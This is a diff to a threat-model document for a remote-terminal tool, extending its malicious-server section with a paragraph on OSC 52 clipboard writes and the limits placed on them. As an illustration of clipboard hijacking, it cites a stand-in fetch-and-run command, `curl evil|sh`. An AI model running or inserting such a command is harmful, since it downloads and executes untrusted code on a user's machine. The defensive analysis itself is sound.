@@ -22,9 +22,17 @@ service.
    gauntlet. The server is the high-value target (it runs a shell).
 2. **Malicious / compromised server** — a server a client dials (a wrong/typo'd node-id, or a popped
    host). It sends arbitrary screen-state instructions + out-of-band data (title/icon/bell/clipboard).
-   **Goal it must be denied:** crash / OOM / hang the client. It *can* mislead a user who chose to
-   connect to it — that is inherent, and with no second factor the node-id is the only thing tying a
-   session to a specific server, so node-ids should be verified out-of-band.
+   **Goal it must be denied:** crash / OOM / hang the client, or leave lasting state in the user's
+   terminal (its palette, modes, keyboard flags). It *can* mislead a user who chose to connect to
+   it — that is inherent, and with no second factor the node-id is the only thing tying a session
+   to a specific server, so node-ids should be verified out-of-band.
+   **The clipboard:** clipboard writes (OSC 52) are on by default, by the owner's choice, so a
+   remote program's copy works. A hostile server can therefore replace what the user copied (a
+   command swapped for `curl evil|sh`); `koh connect --no-clipboard` turns them off, and a user
+   who does not trust the server should pass it. What bounds them: only base64 of at most 1 MiB is
+   forwarded, always to the `c` selection; the clipboard is never read (a query, `OSC 52 ; c ; ?`,
+   is neither forwarded nor answered, and the client asks the user's terminal nothing), so nothing
+   the user copied reaches the server.
 3. **Network / MITM** — QUIC + TLS 1.3 (via iroh) give transport encryption and node-id
    authentication by construction (no TOFU window). Considered: replay, and connection-level tamper.
 4. **Local attacker** — another uid on the same host. Targets: the identity key file, the state dir,
